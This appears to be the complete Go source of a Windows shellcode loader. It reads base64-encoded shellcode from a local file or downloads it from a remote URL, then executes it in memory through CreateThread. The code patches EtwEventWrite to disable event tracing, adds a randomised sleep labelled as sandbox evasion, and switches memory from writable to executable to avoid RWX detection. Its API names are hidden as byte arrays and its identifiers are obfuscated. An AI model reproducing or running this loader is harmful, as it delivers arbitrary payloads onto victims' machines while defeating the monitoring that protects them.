package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	qrglmdas5 = windows.NewLazySystemDLL(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	sjcvttkk = windows.NewLazySystemDLL(string([]byte{110,116,100,108,108,46,100,108,108}))

	prochtxumf3z245lw = sjcvttkk.NewProc(string([]byte{82,116,108,77,111,118}) + string([]byte{101,77,101,109,111,114,121}))
)

func yiqb70m() int {
	ch := make(chan int, 1)
	ch <- 738
	return <-ch
}

func iu9ldrabb() int {
	x := 0
	for i := 0; i < 47; i++ {
		x += i * 4
	}
	return x
}

func q4s4hqm2v() []int {
	s := make([]int, 6)
	for i := range s {
		s[i] = i * 7 + 35
	}
	return s
}

func zst2f22f2bpo(err error, msg string) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
		os.Exit(1)
	}
}

func bre3ry6ufuja() {
	ia6e2kc5v4y := sjcvttkk.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105}) + string([]byte{116,101}))
	ia6e2kc5v4y.Find()
	patch := []byte{0xC3}
	var n5g1e6l uint32
	vp := qrglmdas5.NewProc(string([]byte{86,105}) + string([]byte{114,116}) + string([]byte{117,97}) + string([]byte{108,80,114,111,116,101,99,116}))
	vp.Call(ia6e2kc5v4y.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&n5g1e6l)))
	*(*byte)(unsafe.Pointer(ia6e2kc5v4y.Addr())) = patch[0]
	vp.Call(ia6e2kc5v4y.Addr(), 1, uintptr(n5g1e6l), uintptr(unsafe.Pointer(&n5g1e6l)))
}

func b6ha7gl1g9031(url string) []byte {
	zfsgoxtma := &http.Client{}
	zgenvc7i47b, err := zfsgoxtma.Get(url)
	zst2f22f2bpo(err, "download failed")
	defer zgenvc7i47b.Body.Close()
	data, err := io.ReadAll(zgenvc7i47b.Body)
	zst2f22f2bpo(err, "read failed")
	return data
}

func umslt2w969g(p string) []byte {
	data, err := os.ReadFile(p)
	zst2f22f2bpo(err, "load failed")
	return data
}

func cvtby5xcm6l(data []byte) []byte {
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	zst2f22f2bpo(err, "decode failed")
	return decoded
}

func fiz6q53nccp(ibdsohh99 []byte) {
	bre3ry6ufuja()

	// Timing jitter — sandbox evasion
	hlpx8dpgrqe := time.Duration(rand.Intn(800)+200) * time.Millisecond
	time.Sleep(hlpx8dpgrqe)

	// VirtualAlloc PAGE_READWRITE (no RWX signature)
	hlqpcl46en9rf, err := windows.VirtualAlloc(
		0,
		uintptr(len(ibdsohh99)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	zst2f22f2bpo(err, "VirtualAlloc failed")

	// Copy shellcode into RW region
	prochtxumf3z245lw.Call(
		hlqpcl46en9rf,
		uintptr(unsafe.Pointer(&ibdsohh99[0])),
		uintptr(len(ibdsohh99)),
	)

	// Flip to RX (execute, no write) — avoids RWX detection
	var n5g1e6l uint32
	vp := qrglmdas5.NewProc(string([]byte{86,105}) + string([]byte{114,116}) + string([]byte{117,97}) + string([]byte{108,80,114,111,116,101,99,116}))
	vp.Call(hlqpcl46en9rf, uintptr(len(ibdsohh99)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&n5g1e6l)))

	// CreateThread with 32MB stack + WaitForSingleObject
	m1bnuqpzj7x, _, err := qrglmdas5.NewProc(string([]byte{67,114,101}) + string([]byte{97,116,101,84,104,114,101,97,100})).Call(0, 33554432, hlqpcl46en9rf, 0, 0x00010000, 0)
	if m1bnuqpzj7x == 0 {
		zst2f22f2bpo(err, "CreateThread failed")
	}
	qrglmdas5.NewProc(string([]byte{87}) + string([]byte{97,105,116,70,111,114,83,105,110}) + string([]byte{103,108,101}) + string([]byte{79,98,106,101,99,116})).Call(m1bnuqpzj7x, 0xFFFFFFFF)
}

func main() {
	cj3pkkf4tmj4n := flag.String("local", "", "Path to local base64-encoded shellcode file")
	kpjq55f92hsu := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
	flag.Parse()

	var sb7sow1p0 []byte

	if *cj3pkkf4tmj4n != "" {
		sb7sow1p0 = umslt2w969g(*cj3pkkf4tmj4n)
	} else if *kpjq55f92hsu != "" {
		sb7sow1p0 = b6ha7gl1g9031(*kpjq55f92hsu)
	} else {
		fmt.Println("[!] Usage: -local <path> | -remote <url>")
		os.Exit(1)
	}

	ck12tis := cvtby5xcm6l(sb7sow1p0)
	fmt.Println("[+] Shellcode decoded. Executing...")
	fiz6q53nccp(ck12tis)
}
